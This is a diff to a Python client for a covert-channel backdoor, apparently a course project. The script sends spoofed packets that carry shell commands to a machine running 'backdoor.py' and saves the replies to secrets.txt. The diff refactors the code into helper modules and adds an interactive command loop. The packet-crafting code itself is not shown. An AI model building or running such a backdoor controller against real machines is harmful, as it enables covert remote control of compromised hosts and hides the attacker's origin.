@@ -14,7 +14,7 @@
 ##	NOTES:
 ##	The program will send a covert message to a specific IP address (an IP running the backdoor.py) over a specific
 ##  destination port. The program also has the ability to spoof the source port and source IP address. Once a command
-##  is sent the client will wait for a responce from the backdoor and save the output to secrets.txt.
+##  is sent the client will wait for a response from the backdoor and save the output to secrets.txt.
 ##
 ##  OUTPUT: secrets.txt - will be saved in the program root directory.
 ##
@@ -22,38 +22,15 @@
 ##
 #####################################################################################################################
 import sys
-from scapy.all import*
+from client_utils import*
+from client_packet import*
 import time
 import os
+import re
 import getopt
-from itertools import izip, cycle
-
-###################### USER DEFINED VARIABLE ##########################
-DEFAULT_INTERFACE = 'em1'
-
-DEFAULT_SRC_PORT = 8000
-DEFAULT_DST_PORT = 7999
-
-DEFAULT_SRC_IP = "192.168.0.5"
-
-ENCRYPTION_KEY = "zdehjk"
-######################################################################
-
-def usage():
-    "This prints usage example for the program"
-    print("Usage: %s -d <Destination IP> -p [Destination Port] -b [Source IP] -s [Source Port] -i [Interface]")
-    print("You must specify the destination address!")
-    return
-
-##Set Default Values
-interface = DEFAULT_INTERFACE
-sport = DEFAULT_SRC_PORT
-dport = DEFAULT_DST_PORT
-src = DEFAULT_SRC_IP
-dest = None
 
 try:
-    opts, args = getopt.getopt(sys.argv[1:], 'd:p:b:s:i:h', ['dest=', 'dport=', 'src=', 'sport=', 'interface=', 'help'])
+    opts, args = getopt.getopt(sys.argv[1:], 'd:p:b:s:i:l:h', ['dest=', 'dport=', 'src=', 'sport=', 'interface=', 'listener=', 'help'])
 except getopt.GetoptError:
     usage()
     sys.exit(2)
@@ -61,24 +38,33 @@ except getopt.GetoptError:
 for opt, arg in opts:
     if opt in ('-h', '--help'):
         usage()
-        sys.exit(2)
+        sys.exit(0)
     elif opt in ('-d', '--dest'):
-        dest = arg
+        packet['dest'] = arg
     elif opt in ('-p', '--dport'):
-        dport = arg
+        packet['dport'] = arg
     elif opt in ('-b', '--src'):
-        src = arg
+        packet['src'] = arg
     elif opt in ('-s', '--sport'):
-        sport = arg
+        packet['sport'] = arg
     elif opt in ('-i', '--interface'):
-        interface = arg
+        packet['interface'] = arg
+    elif opt in ('-l', '--listener'):
+        packet['lport'] = arg
     else:
         usage()
         sys.exit(2)
 
 ##Did they supply a destination IP?
-if not dest:
+if not packet['dest']:
     usage()
     sys.exit(2)
 
+##Get commands from user
+while 1:
+    packet['cmd'] = raw_input("\nPlease enter a covert command (or type \"quit\"): \n")
+    if packet['cmd'] == "quit":
+        sys.exit(0)
+    sniff_packets(packet['dest'])
+    send_packet(packet)
 
